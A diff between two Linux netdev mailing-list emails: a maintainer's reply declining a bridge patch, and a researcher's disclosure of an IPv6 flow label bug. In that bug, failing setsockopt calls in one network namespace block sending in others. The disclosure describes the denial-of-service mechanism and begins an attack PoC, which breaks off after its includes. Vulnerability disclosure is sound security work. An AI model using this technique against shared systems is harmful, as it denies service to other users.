@@ -2,196 +2,331 @@ Return-Path: <netdev-owner@vger.kernel.org>
 X-Original-To: lists+netdev@lfdr.de
 Delivered-To: lists+netdev@lfdr.de
 Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
-	by mail.lfdr.de (Postfix) with ESMTP id E789F4B3ABD
-	for <lists+netdev@lfdr.de>; Sun, 13 Feb 2022 11:13:37 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTP id 2BDC64B3ACE
+	for <lists+netdev@lfdr.de>; Sun, 13 Feb 2022 11:31:57 +0100 (CET)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S234927AbiBMKNk (ORCPT <rfc822;lists+netdev@lfdr.de>);
-        Sun, 13 Feb 2022 05:13:40 -0500
-Received: from mxb-00190b01.gslb.pphosted.com ([23.128.96.19]:44220 "EHLO
+        id S234946AbiBMKbp (ORCPT <rfc822;lists+netdev@lfdr.de>);
+        Sun, 13 Feb 2022 05:31:45 -0500
+Received: from mxb-00190b01.gslb.pphosted.com ([23.128.96.19]:48682 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S229935AbiBMKNi (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Sun, 13 Feb 2022 05:13:38 -0500
-Received: from NAM12-DM6-obe.outbound.protection.outlook.com (mail-dm6nam12on2060.outbound.protection.outlook.com [40.107.243.60])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id B6BBC5D18A;
-        Sun, 13 Feb 2022 02:13:32 -0800 (PST)
+        with ESMTP id S229935AbiBMKbo (ORCPT
+        <rfc822;netdev@vger.kernel.org>); Sun, 13 Feb 2022 05:31:44 -0500
+Received: from NAM04-BN8-obe.outbound.protection.outlook.com (mail-bn8nam08on2114.outbound.protection.outlook.com [40.107.100.114])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 564C25D197
+        for <netdev@vger.kernel.org>; Sun, 13 Feb 2022 02:31:38 -0800 (PST)
 ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
- b=oH7iO0wngcYdonjZe8aq1A7HOAAh1Sb2GwdHzGiYBXpQlYiubQ7IpnAC7q79z0hWwyeLnpQdlBflh1HBzePrPIFOyW11m1rcVw+zxAWpiQr53SVECUVePsY56x03MjiQXhU/3mxSRz7Z6jQWisSrxhmUu91/IbG9Xpnhfi98ATzTSePzawF0qR4qdt+z0LkWQrAcOQ7ZmalLrbniJmGqL1Wc0qGekNwb4Wj/Nf9Xt2uJspcO3kIjrm1JVMIWd2Rs88a8DXpXjD4pzN4Hkg9Fbhye0gphzdgdohs7HWLp84Kj6AFmwauiPH/12yZWE/5jgvOp+VhNA5dLm7qufyncng==
+ b=gBldlphgbCKbRPHWHb89Cy5JydAFlPWylbdi2f0mV+wPDGowIOkLWT01D+NTAZvEQALybSZiUfP5SbRQ4b92DcNEpx9AgwOBijpMhEl9F1bSVaGHbtXx71WHD6Kmf7rv7CeVKOOXYL+0uxS+1mh4AQ2c7lycB6j+oqg8nynR6RU+iHXImFTG587Au8Fb4jzSE088Nk8LRd92Ea7trfcFl8pE+hY1eJI58eBP6J6kgpyn5KOLgZMegsEfKUEFh+57wOt4RfUP0x8jHuvc2bzum4NAbA+1rJo6zduLrMheu+fuzAx3RWoHyuZ1/mOLRIq0YvZOaMD9IHYCq8UNyPdzWA==
 ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
  s=arcselector9901;
  h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=QDsgPaGQAZTLjsQ3v5s2KKvlDQ1c0mF7+Owo6M92m4E=;
- b=RZYsx+LWlulf69qZ/InXdYQSGxCX834X1P7rdnQzUDa4Afw/oBW5Sz+GFDZC+4iXjLBp1UhmmmWLmJMPxuXwTECYS/4H2jEIzJebqz73jwKuXPFno/YQdHbia9rYv7U0Zgp8mO3N0DHMaopC01448QIVq7huY93Z0b5AW2ycxsTuI9UBMFA/nNeJJZ6qSWcQkcRHn3Eona+FOcbBPgwMsFsiRAph/VpLf0bQJvRUP7Z3XTEJNoy2vJPjJxGKofTJyWCXcQNlm8EtogjSkkLVibP2peo+PtF6Oz5RH3jiOIFXCjP/tgBMMBX7ySvz+39b8RBAlu0dhxZSoKu8JPExxw==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass (sender ip is
- 12.22.5.236) smtp.rcpttodomain=vger.kernel.org smtp.mailfrom=nvidia.com;
- dmarc=pass (p=reject sp=reject pct=100) action=none header.from=nvidia.com;
- dkim=none (message not signed); arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=Nvidia.com;
- s=selector2;
+ bh=DaQhgaXJ4xbii61ygu2tzI2e0E7FPMjzAH8dDXSfgM0=;
+ b=YQQK+sn2b6d6zx2a32wAVuz3oZans/4lVCqUTYLqXknYfWmym0FFLmby6iy5piRL3se+9SVoPLH1N5mVL74OLjjix0ueqSyW4jAWwcgQs5DSGiKrTE00znURkr7lWnepvUblGG9Y+5U7H2JtUkBwPMga94sZesK7GoVqmkYukxSvreVVvEyWx+uiyrNOc540VRGJsaNNwowiaJgGPDgx/KjK47hyrElRe0bZl2OBQc2xcxHyMQxNRId8y4iKpQDyLln0QfiIWUx5jJ+jEzlnCr6qlGxodx6XxvIY7ZcLbonM3IgQN5S/pUdoAjp1sjYIpjbDXbFwDv0r2RSGI/QhbQ==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
+ dkim=none; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=purdue0.onmicrosoft.com; s=selector2-purdue0-onmicrosoft-com;
  h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=QDsgPaGQAZTLjsQ3v5s2KKvlDQ1c0mF7+Owo6M92m4E=;
- b=SOlhjmbKRfs1zTc19LqSeOomHOg4KrbuNt/Do6kDXTFyquCZkhB+hzCcGThz4S5NvdCDdMouA2Q+l7rmuf7Agj9rJGyaau3q1ZYsXyXaEup2rRbxm8nrChjXnttucn6lbMM8gDVgBz8XGcDJlW6w2OYw96tEYdFCRc9ONOIscB3nGi/BQgQRMbe5oSzL5uPd0pX8PAF27acQ/vFl2fC57zGxR+kDJx5JkR/HrGPrzUqSOMZoVP3NdPy30OK7VgQUjAvn74NtyfaxKrG7vpP0llfxgCZsiIUVbJvnsB+CYVoN3S6EM/Jq4KOwI6nyWwq2dFR4U3R9KxAcEys4hAVobA==
-Received: from BN0PR02CA0026.namprd02.prod.outlook.com (2603:10b6:408:e4::31)
- by MW3PR12MB4586.namprd12.prod.outlook.com (2603:10b6:303:53::7) with
- Microsoft SMTP Server (version=TLS1_2,
+ bh=DaQhgaXJ4xbii61ygu2tzI2e0E7FPMjzAH8dDXSfgM0=;
+ b=DYbV4DwmU5NjNAlLNIjzOkcZpOjFF07vRQGKXajPvydwWBCpl5vTPPYVzJSmhktCu/7drM9lJWWTC1LYyBzj9Lkn3dzo8VP19mSLOnQJaMbG6caQFQcCAeALV+qt9d02TGgvQZgs/UhWKns+6BIkeZaOBF42jtRdR8B1Wt8lmA4=
+Received: from MWHPR2201MB1072.namprd22.prod.outlook.com
+ (2603:10b6:301:33::18) by PH0PR22MB2873.namprd22.prod.outlook.com
+ (2603:10b6:510:f8::8) with Microsoft SMTP Server (version=TLS1_2,
  cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.4975.11; Sun, 13 Feb
- 2022 10:13:31 +0000
-Received: from BN8NAM11FT006.eop-nam11.prod.protection.outlook.com
- (2603:10b6:408:e4:cafe::20) by BN0PR02CA0026.outlook.office365.com
- (2603:10b6:408:e4::31) with Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.4975.15 via Frontend
- Transport; Sun, 13 Feb 2022 10:13:30 +0000
-X-MS-Exchange-Authentication-Results: spf=pass (sender IP is 12.22.5.236)
- smtp.mailfrom=nvidia.com; dkim=none (message not signed)
- header.d=none;dmarc=pass action=none header.from=nvidia.com;
-Received-SPF: Pass (protection.outlook.com: domain of nvidia.com designates
- 12.22.5.236 as permitted sender) receiver=protection.outlook.com;
- client-ip=12.22.5.236; helo=mail.nvidia.com;
-Received: from mail.nvidia.com (12.22.5.236) by
- BN8NAM11FT006.mail.protection.outlook.com (10.13.177.21) with Microsoft SMTP
- Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384) id
- 15.20.4975.11 via Frontend Transport; Sun, 13 Feb 2022 10:13:30 +0000
-Received: from rnnvmail201.nvidia.com (10.129.68.8) by DRHQMAIL109.nvidia.com
- (10.27.9.19) with Microsoft SMTP Server (TLS) id 15.0.1497.18; Sun, 13 Feb
- 2022 10:13:29 +0000
-Received: from [172.27.1.51] (10.126.231.35) by rnnvmail201.nvidia.com
- (10.129.68.8) with Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.2.986.9; Sun, 13 Feb 2022
- 02:13:25 -0800
-Message-ID: <52b71034-d35a-75cd-cb7b-e7a1d355b361@nvidia.com>
-Date:   Sun, 13 Feb 2022 12:13:21 +0200
-MIME-Version: 1.0
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
- Thunderbird/91.5.0
-Subject: Re: [PATCH] net: bridge: Slightly optimize br_stp_change_bridge_id()
+ 2022 10:31:35 +0000
+Received: from MWHPR2201MB1072.namprd22.prod.outlook.com
+ ([fe80::54ec:7a2b:ad0c:c89]) by MWHPR2201MB1072.namprd22.prod.outlook.com
+ ([fe80::54ec:7a2b:ad0c:c89%7]) with mapi id 15.20.4975.015; Sun, 13 Feb 2022
+ 10:31:34 +0000
+From:   "Liu, Congyu" <liu3101@purdue.edu>
+To:     "willemb@google.com" <willemb@google.com>,
+        "security@kernel.org" <security@kernel.org>,
+        "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>,
+        "netdev@vger.kernel.org" <netdev@vger.kernel.org>
+Subject: BUG: potential net namespace bug in IPv6 flow label management 
+Thread-Topic: BUG: potential net namespace bug in IPv6 flow label management 
+Thread-Index: AQHYIMSI8GnBA/CCckW7koPG3MiKnA==
+Date:   Sun, 13 Feb 2022 10:31:34 +0000
+Message-ID: <MWHPR2201MB1072BCCCFCE779E4094837ACD0329@MWHPR2201MB1072.namprd22.prod.outlook.com>
+Accept-Language: en-US, zh-CN
 Content-Language: en-US
-To:     Christophe JAILLET <christophe.jaillet@wanadoo.fr>,
-        Roopa Prabhu <roopa@nvidia.com>,
-        "David S. Miller" <davem@davemloft.net>,
-        Jakub Kicinski <kuba@kernel.org>
-CC:     <linux-kernel@vger.kernel.org>, <kernel-janitors@vger.kernel.org>,
-        <bridge@lists.linux-foundation.org>, <netdev@vger.kernel.org>
-References: <73f674075ae5279e3d2fa07d61a0a75bc50790f3.1644659879.git.christophe.jaillet@wanadoo.fr>
-From:   Nikolay Aleksandrov <nikolay@nvidia.com>
-In-Reply-To: <73f674075ae5279e3d2fa07d61a0a75bc50790f3.1644659879.git.christophe.jaillet@wanadoo.fr>
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: 7bit
-X-Originating-IP: [10.126.231.35]
-X-ClientProxiedBy: rnnvmail202.nvidia.com (10.129.68.7) To
- rnnvmail201.nvidia.com (10.129.68.8)
-X-EOPAttributedMessage: 0
-X-MS-PublicTrafficType: Email
-X-MS-Office365-Filtering-Correlation-Id: deac7e73-b56a-416e-9075-08d9eed97c00
-X-MS-TrafficTypeDiagnostic: MW3PR12MB4586:EE_
-X-Microsoft-Antispam-PRVS: <MW3PR12MB4586213BFD43D6FF9A274003DF329@MW3PR12MB4586.namprd12.prod.outlook.com>
-X-MS-Oob-TLC-OOBClassifiers: OLM:10000;
-X-MS-Exchange-SenderADCheck: 1
-X-MS-Exchange-AntiSpam-Relay: 0
-X-Microsoft-Antispam: BCL:0;
-X-Microsoft-Antispam-Message-Info: 49onjw2kRw9N2vQyeQGDUTl0pwjmyd69ih7Orrla/c5ngTpmWW+jh29sGKXhaPFJIAMZ9Mw4t6/jxx8/7qTocynihHz13mmUj+pO8lF8kdHUz/K2WxwH16aFwVoiqXadloTB1nh0h7uZS4AybRp81jO5GTtvD/uO/Rf+X2jYPUIu6X97dcIa/oIT+AXP2/hu0BG3wM/rULmrpRrMLFMApG23fLiqygHGVj1f2w8jdCloSe2vz/mSo59VxwIfaXgxxfRPtwdInLThFUjrQrlbvsoP7xmTnCv7EWVtQVYmeUG/5fukENf16KEib1724ik9yEbWskvfh4z/BfoQkJucO5HwuvjOZrlCmOb4M54Mal2I9MEicZ6Fbs0IoKN7xo6VvcWfnxtTnflttI5IZW4W7wnHi/31/p/YusSmW4Qk2Rk0dTgO5f5C0nctAxLBv1hFm9c3qeuA9WY7wITKx+3cptr+dm6YnclsU3nSokpfo76yIPXarnDdp9Yv8zwjEhYDuawin37erg5VScGQRnO+Xs6zqRKNlPE3YbGQe9JRPTp/YgXMG8UFH+hQsJHDHjiKG7xmodjlDMs5GzpPE5re3emPzN4P2pKnDayvH7y8C6TC+fyzWxNnyypA+5HdKsqGeJDzRGKzMSyydRnljXynrVZXkBdspBGHiMBX4ZPAV60Werl90wsyROaq6hXXN/1+MAcR1SQHiRTzYX+DppOsE3pURDkJ/cKoGq6+gwcgjGRTd9+arYG9ZTqwC4D+T33LXfM0typ05xeA+UOWar95CwMBqbQo6iNJpEkp57zSVeQ=
-X-Forefront-Antispam-Report: CIP:12.22.5.236;CTRY:US;LANG:en;SCL:1;SRV:;IPV:CAL;SFV:NSPM;H:mail.nvidia.com;PTR:InfoNoRecords;CAT:NONE;SFS:(13230001)(4636009)(40470700004)(46966006)(36840700001)(2906002)(81166007)(356005)(5660300002)(6666004)(70206006)(316002)(83380400001)(336012)(31686004)(186003)(8676002)(26005)(426003)(31696002)(16526019)(16576012)(53546011)(2616005)(4326008)(70586007)(8936002)(40460700003)(47076005)(54906003)(36860700001)(86362001)(110136005)(36756003)(508600001)(82310400004)(36900700001)(43740500002);DIR:OUT;SFP:1101;
-X-OriginatorOrg: Nvidia.com
-X-MS-Exchange-CrossTenant-OriginalArrivalTime: 13 Feb 2022 10:13:30.3486
+X-MS-Has-Attach: 
+X-MS-TNEF-Correlator: 
+suggested_attachment_session_id: edf62604-8a8f-ce5f-7dc0-45abab434485
+authentication-results: dkim=none (message not signed)
+ header.d=none;dmarc=none action=none header.from=purdue.edu;
+x-ms-publictraffictype: Email
+x-ms-office365-filtering-correlation-id: 89e39460-9c23-47bc-557c-08d9eedc0210
+x-ms-traffictypediagnostic: PH0PR22MB2873:EE_
+x-microsoft-antispam-prvs: <PH0PR22MB2873B76E50024B5BA442D0A8D0329@PH0PR22MB2873.namprd22.prod.outlook.com>
+x-ms-oob-tlc-oobclassifiers: OLM:9508;
+x-ms-exchange-senderadcheck: 1
+x-ms-exchange-antispam-relay: 0
+x-microsoft-antispam: BCL:0;
+x-microsoft-antispam-message-info: 2pzUeBAvsx4fJ01mS8ifuXj+qI+/ypRg+Nj83NR/jPTwWjn6w6l0RLEWs1B4qoa2yraFdL3jRgTed7s/r/domsPoN/Hb8cj7CfJXt0bBCK5Vn4OsBYHzTc+5qYAaLBrY+qGSfqmJ02YM9TPSSHV29wLzEp5LgNhV38uuiK7ciHeAiAgP5OLowLZ8gAwKhs9nymACJxDQTN7vK/5GdGEPe4zTUwjSqTJbiYjINC8AzrXR31vWEDVHmBNiX02dWoNVmlBv0/OGyMjfHOlMLmyCL7zX78y6rxwmHusXgl6SWCyIVDcRn11hGrj3azN5i65HgFbI3qYYC79h7yWEP2Oe6ZUC/H2lusdfj8Yp/VyBRu/csPsKLhfyIwNs7bNNzFb+wfX93QjtZn6rpWqUQkyZnPnV1bAf534RBkNmKiVfMsoonVOiZlqn0LFc0yTIKBDW3buZSwL8cdxpriddP7L/HnUQ6gKlm/42mjwbKa3kHb05kMvpioBmdp/66GvnnDBd4LTNSAxmhW7g18YtQWUSyng4n4v+wdv3jRpdI0dF0229SM7E47/mqJ6nm3Y6lqcHt5Rlf3ie3HbuXDzt5LRJ399LyEURdiQQIKKeqxEEEM96GslUsyfyL0ARb92Fe9N9rFK81HP1XK3pLOZ/uuyBIdGpImn3FuzwGY2xiM8AfTPmPcHBDKnEcC2p6nfg1dTzV9+mf+BZVYZdR0NEK+IfyQ==
+x-forefront-antispam-report: CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:MWHPR2201MB1072.namprd22.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230001)(4636009)(366004)(66946007)(2906002)(76116006)(4743002)(9686003)(786003)(52536014)(110136005)(75432002)(55016003)(83380400001)(5660300002)(186003)(66556008)(7696005)(38070700005)(6506007)(71200400001)(86362001)(64756008)(66476007)(66446008)(8676002)(33656002)(91956017)(8936002)(38100700002)(316002)(122000001)(508600001);DIR:OUT;SFP:1102;
+x-ms-exchange-antispam-messagedata-chunkcount: 1
+x-ms-exchange-antispam-messagedata-0: =?iso-8859-1?Q?Y+OSBG1OAnnAuiG9NdqYjfmCbgvg+NmJksZjnsik8N7bKukLqzQJDFfQOz?=
+ =?iso-8859-1?Q?/hDoWheH1r1j4DyUM+5q8Pl+VSDR48CVuZDYSC0vfcXkGuO9VFfmnkop2u?=
+ =?iso-8859-1?Q?c2hcJh+143G2qKLa28ddh33MoJ4r37kEXZiMRO0Pc0pVQiX0ATERdjxo0a?=
+ =?iso-8859-1?Q?r+ptiTH5vqmTH/mYQyUwKh/zY+IQwrTc06/gFpMFpHNcbOMLND7i7cK2c4?=
+ =?iso-8859-1?Q?IYVZURj8um/LgXKQ/hOS7zTvGiASLndH1PJCiWlDD54LnWvD/uf9gZ1Ntx?=
+ =?iso-8859-1?Q?Qpk/KMojTzxGsADcNFcGuSmgHYsHgzTWAbZpEXVu5zyllb7ilzgXR4QG2I?=
+ =?iso-8859-1?Q?9tFfQEYUgZV0EeA3fOtNlJnFpRzmxmLpaEUn1WXds3G/TS6hWnfn8pHc/R?=
+ =?iso-8859-1?Q?W0845xSQfXc/oml8Wk3t8t1P+K5Gxt1P25yAZ87Sb5T0eMBQEHuva65c7v?=
+ =?iso-8859-1?Q?g3++S5iJbOgcRtBiDd/JNugbT9N58uqVYPgwp9/UK8LrsBt/xTqcn/GYbX?=
+ =?iso-8859-1?Q?y2lLbeZxkMvN85j56kBdq86l8kg6lJ/GuKFsylRF2FZhFWVECfYn04Q4Ph?=
+ =?iso-8859-1?Q?eVJt2lGBB2GvQCYEvt2Sd5Bs7t1xb6dNIzT+xd2RdSI2PCdxT7MV2N+puj?=
+ =?iso-8859-1?Q?vikQiEdzLQUnlaJXSDxJyyf81owtaOvfo8739RGcCjWP0MEWQRKgvpiV+2?=
+ =?iso-8859-1?Q?qUMWdK3ussfVgsmbHnT9DiqSmYkcNTfVu6P+z7tgnG/ffwJIlp3ORIebGx?=
+ =?iso-8859-1?Q?D73t6kHrdFvVprWSH73nrToYhFSeU3EvqWtO5LaM8naC4wbchu8xGSIiOs?=
+ =?iso-8859-1?Q?myedsZ9XSqpfm2BWzo/igKNO3KwWMzbe304REJnw5DOpzGKH7i892iQYRP?=
+ =?iso-8859-1?Q?009nqfNYn091Hy/T0Ty+GIZrNEwTCm+KwPe1jDDx6jtIOut/gFaUKA9AJw?=
+ =?iso-8859-1?Q?Z10OdfBGlS2kLKxOM7pj+RxC5yXQN8jsfWNSySrqUW/dUDi7Nu3XImdi6y?=
+ =?iso-8859-1?Q?lkgNtM8nKzdx2FpuRnW4MWEODWM+5TGBa7AM5vXeyu/hO+oJZ0Dwz0wGNk?=
+ =?iso-8859-1?Q?5JBD4yT/NEykt6h7CbnRYB2T4oqYe0lsJYomQYGxcNEqTfqbMAWfQ6f8mK?=
+ =?iso-8859-1?Q?2VEVY0EAZMKFtB0uJtrZ4Sp6B9+Da1UQOJSz0CPml8GAqiTuvXCh8MN0zh?=
+ =?iso-8859-1?Q?Z9t5D8cTaPc/6icUtzA76J/ZTjn8wtrIhm6eEQdpke40dxCiPdGAKtoGOR?=
+ =?iso-8859-1?Q?kxTPjKaDhxQz9lEUoEEQZk6741kC8awzBiRal1zmzv4rYozyhkHefzgsCA?=
+ =?iso-8859-1?Q?KNViDa1+0uUnygWG0vfotsy40g1pAIMaSDFlJDkd+rvVkAju1vOCvqx0bp?=
+ =?iso-8859-1?Q?4GQrxb85PG1khrbwR3HMzdHAN87y2JKZSdcwYI76FjBUWs0aLlGBnKokvH?=
+ =?iso-8859-1?Q?dtKhT/8CYIq68zbe4oiR1N4oqxSi27ECAdkWa5fKIzvejex35x3So2ryym?=
+ =?iso-8859-1?Q?sJpKeJYB/4+J4IRT40Kx+ArCICypaHNfDn9diTXF/gUYGwvOLIxvZhZDJ+?=
+ =?iso-8859-1?Q?E2/xwnglOORVfc9ztQbNYrpcnSQpyC1PHVCkW1cF1s6kN4RUA/llxbLFE7?=
+ =?iso-8859-1?Q?61lmFcnqTMpuyVx6isYXEAtPIfrkDeMbodJeWRKZz1M2+LlCtDeL5Nfmc/?=
+ =?iso-8859-1?Q?2CFnSVrdmlTFVjSNcYdsdD6/+id6yVlWwznBJ8sx1sLWyIveC/4A86Nhp6?=
+ =?iso-8859-1?Q?VM4Q=3D=3D?=
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+X-OriginatorOrg: purdue.edu
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-AuthSource: MWHPR2201MB1072.namprd22.prod.outlook.com
+X-MS-Exchange-CrossTenant-Network-Message-Id: 89e39460-9c23-47bc-557c-08d9eedc0210
+X-MS-Exchange-CrossTenant-originalarrivaltime: 13 Feb 2022 10:31:34.3539
  (UTC)
-X-MS-Exchange-CrossTenant-Network-Message-Id: deac7e73-b56a-416e-9075-08d9eed97c00
-X-MS-Exchange-CrossTenant-Id: 43083d15-7273-40c1-b7db-39efd9ccc17a
-X-MS-Exchange-CrossTenant-OriginalAttributedTenantConnectingIp: TenantId=43083d15-7273-40c1-b7db-39efd9ccc17a;Ip=[12.22.5.236];Helo=[mail.nvidia.com]
-X-MS-Exchange-CrossTenant-AuthSource: BN8NAM11FT006.eop-nam11.prod.protection.outlook.com
-X-MS-Exchange-CrossTenant-AuthAs: Anonymous
-X-MS-Exchange-CrossTenant-FromEntityHeader: HybridOnPrem
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: MW3PR12MB4586
-X-Spam-Status: No, score=-1.0 required=5.0 tests=BAYES_00,DKIMWL_WL_HIGH,
-        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,FORGED_SPF_HELO,
-        NICE_REPLY_A,RCVD_IN_DNSWL_NONE,RCVD_IN_MSPIKE_H2,SPF_HELO_PASS,
-        SPF_NONE,T_SCC_BODY_TEXT_LINE autolearn=no autolearn_force=no
-        version=3.4.6
+X-MS-Exchange-CrossTenant-fromentityheader: Hosted
+X-MS-Exchange-CrossTenant-id: 4130bd39-7c53-419c-b1e5-8758d6d63f21
+X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
+X-MS-Exchange-CrossTenant-userprincipalname: GPXl7uM0zLVZar1zxA7OXmIwEoxhl03UAevy2nRFphetgP3MrG82j1mo4xbZ/YaS+sz/WU59z7bnCvAhgX6A6A==
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: PH0PR22MB2873
+X-Spam-Status: No, score=-1.9 required=5.0 tests=BAYES_00,DKIM_SIGNED,
+        DKIM_VALID,RCVD_IN_DNSWL_NONE,RCVD_IN_MSPIKE_H2,SPF_HELO_PASS,SPF_PASS,
+        T_SCC_BODY_TEXT_LINE autolearn=ham autolearn_force=no version=3.4.6
 X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
         lindbergh.monkeyblade.net
 Precedence: bulk
 List-ID: <netdev.vger.kernel.org>
 X-Mailing-List: netdev@vger.kernel.org
 
-On 12/02/2022 11:58, Christophe JAILLET wrote:
-> ether_addr_equal_64bits() can easy be used in place of ether_addr_equal()
-> here.
-> Padding in the 'net_bridge_port' structure is already there because it is a
-> huge structure and the required fields are not at the end.
-> 'oldaddr' is local to the function. So add the required padding
-> explicitly and simplify its definition.
-> 
-> Signed-off-by: Christophe JAILLET <christophe.jaillet@wanadoo.fr>
-> ---
-> This patch is more a POC for me.
-> 
-> I'm unsure that using ether_addr_equal_64bits() is really useful. The
-> speedup should be mostly un-noticeable.
-> 
-> To make sure that we have the required padding, we either need to waste
-> some space or rely on the fact that the address is embedded in a large
-> enough structure. (which is the case here)
-> 
-> So, it looks fragile to me and not future-proof.
-> 
-> Feed-back highly appreciated to see if such patches are welcome and if I
-> should spend some time on it.
-> ---
-
-This is slow path, more so as you've noted above the change is fragile and someone
-can easily miss it, I appreciate the comments but for this case I'd prefer to
-leave the code as-is to keep it obviously correct and avoid future problems.
-
-Thanks,
- Nik
-
->  net/bridge/br_private.h |  5 +++++
->  net/bridge/br_stp_if.c  | 12 +++++++-----
->  2 files changed, 12 insertions(+), 5 deletions(-)
-> 
-> diff --git a/net/bridge/br_private.h b/net/bridge/br_private.h
-> index 2661dda1a92b..2f78090574c9 100644
-> --- a/net/bridge/br_private.h
-> +++ b/net/bridge/br_private.h
-> @@ -363,6 +363,11 @@ struct net_bridge_port {
->  	unsigned char			config_pending;
->  	port_id				port_id;
->  	port_id				designated_port;
-> +	/*
-> +	 * designated_root and designated_bridge must NOT be at the end of the
-> +	 * structure because ether_addr_equal_64bits() requires 2 bytes of
-> +	 * padding.
-> +	 */
->  	bridge_id			designated_root;
->  	bridge_id			designated_bridge;
->  	u32				path_cost;
-> diff --git a/net/bridge/br_stp_if.c b/net/bridge/br_stp_if.c
-> index 75204d36d7f9..1bf0aaf29e5e 100644
-> --- a/net/bridge/br_stp_if.c
-> +++ b/net/bridge/br_stp_if.c
-> @@ -221,9 +221,11 @@ int br_stp_set_enabled(struct net_bridge *br, unsigned long val,
->  /* called under bridge lock */
->  void br_stp_change_bridge_id(struct net_bridge *br, const unsigned char *addr)
->  {
-> -	/* should be aligned on 2 bytes for ether_addr_equal() */
-> -	unsigned short oldaddr_aligned[ETH_ALEN >> 1];
-> -	unsigned char *oldaddr = (unsigned char *)oldaddr_aligned;
-> +	/*
-> +	 * should be aligned on 2 bytes and have 2 bytes of padding for
-> +	 * ether_addr_equal_64bits()
-> +	 */
-> +	unsigned char oldaddr[ETH_ALEN + 2] __aligned(2);
->  	struct net_bridge_port *p;
->  	int wasroot;
->  
-> @@ -236,10 +238,10 @@ void br_stp_change_bridge_id(struct net_bridge *br, const unsigned char *addr)
->  	eth_hw_addr_set(br->dev, addr);
->  
->  	list_for_each_entry(p, &br->port_list, list) {
-> -		if (ether_addr_equal(p->designated_bridge.addr, oldaddr))
-> +		if (ether_addr_equal_64bits(p->designated_bridge.addr, oldaddr))
->  			memcpy(p->designated_bridge.addr, addr, ETH_ALEN);
->  
-> -		if (ether_addr_equal(p->designated_root.addr, oldaddr))
-> +		if (ether_addr_equal_64bits(p->designated_root.addr, oldaddr))
->  			memcpy(p->designated_root.addr, addr, ETH_ALEN);
->  	}
->  
-
+=0A=
+Hi,=0A=
+=0A=
+In the test conducted on namespace, I found that one unsuccessful IPv6 flow=
+ label =0A=
+management from one net ns could stop other net ns's data transmission that=
+ requests =0A=
+flow label for a short time. Specifically, in our test case, one unsuccessf=
+ul =0A=
+`setsockopt` to get flow label will affect other net ns's `sendmsg` with fl=
+ow label =0A=
+set in cmsg. Simple PoC is included for verification. The behavior descirbe=
+d above =0A=
+can be reproduced in latest kernel.=0A=
+=0A=
+I managed to figure out the data flow behind this: when asking to get a flo=
+w label, =0A=
+some `setsockopt` parameters can trigger function `ipv6_flowlabel_get` to c=
+all `fl_create` =0A=
+to allocate an exclusive flow label, then call `fl_release` to release it b=
+efore returning =0A=
+-ENOENT. Global variable `ipv6_flowlabel_exclusive`, a rate limit jump labe=
+l that keeps =0A=
+track of number of alive exclusive flow labels, will get increased instantl=
+y after calling =0A=
+`fl_create`. Due to its rate limit design, `ipv6_flowlabel_exclusive` can o=
+nly decrease =0A=
+sometime later after calling `fl_decrease`. During this period, if data tra=
+nsmission function =0A=
+in other net ns (e.g. `udpv6_sendmsg`) calls `fl_lookup`, the false `ipv6_f=
+lowlabel_exclusive` =0A=
+will invoke the `__fl_lookup`. In the test case observed, this function ret=
+urns error and =0A=
+eventually stops the data transmission.=0A=
+=0A=
+I further noticed that this bug could somehow be vulnerable: if `setsockopt=
+` is called =0A=
+continuously, then `sendmmsg` call from other net ns will be blocked foreve=
+r. Using the PoC =0A=
+provided, if attack and victim programs are running simutaneously, victim p=
+rogram cannot transmit =0A=
+data; when running without attack program, the victim program can transmit =
+data normally.=0A=
+=0A=
+Thanks,=0A=
+Congyu=0A=
+=0A=
+=0A=
+=0A=
+=0A=
+Attack Program:=0A=
+=0A=
+#define _GNU_SOURCE=0A=
+#include <linux/in6.h>=0A=
+#include <stdio.h>=0A=
+#include <stdlib.h>=0A=
+#include <fcntl.h>=0A=
+#include <string.h>=0A=
+#include <sys/socket.h>=0A=
+#include <netinet/in.h>=0A=
+#include <unistd.h>=0A=
+#include <error.h>=0A=
+#include <errno.h>=0A=
+#include <sched.h>=0A=
